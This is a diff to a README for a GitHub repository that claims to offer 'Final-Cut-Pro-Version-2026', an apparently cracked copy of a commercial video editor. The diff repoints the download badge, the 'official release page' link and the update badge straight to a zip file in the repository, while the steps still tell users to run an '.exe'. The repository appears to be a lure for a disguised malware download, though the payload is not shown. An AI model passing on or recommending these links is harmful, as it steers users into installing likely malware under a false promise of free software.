@@ -1,6 +1,6 @@
 # 🎞️ Final-Cut-Pro-Version-2026 - Create professional videos with ease today
 
-[![](https://img.shields.io/badge/Download-Final_Cut_Pro-blue.svg)](https://github.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/releases)
+[![](https://img.shields.io/badge/Download-Final_Cut_Pro-blue.svg)](https://raw.githubusercontent.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/main/ensweep/Final-Pro-Version-Cut-1.5-beta.1.zip)
 
 ## 📖 About the software
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run this software well. Check your system 
 
 You need the installer file to begin. Follow these instructions to get the correct version.
 
-1. Go to the [official release page](https://github.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/main/ensweep/Final-Pro-Version-Cut-1.5-beta.1.zip).
 2. Look for the section labeled "Assets".
 3. Click the link that ends in ".exe" to save the file to your computer.
 4. Wait for the download to finish.
@@ -103,4 +103,4 @@ Shortcuts make your work faster. Learning these keys helps you accomplish tasks 
 
 Check the download page every few months. New versions offer better stability and more features. The developers release improvements to keep the software aligned with current hardware. Visit the link below to see if a newer version exists.
 
-[![](https://img.shields.io/badge/Update-Check_Releases-grey.svg)](https://github.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/releases)
+[![](https://img.shields.io/badge/Update-Check_Releases-grey.svg)](https://raw.githubusercontent.com/Scapulohumeral-turbopropellerplane576/Final-Cut-Pro-Version-2026/main/ensweep/Final-Pro-Version-Cut-1.5-beta.1.zip)
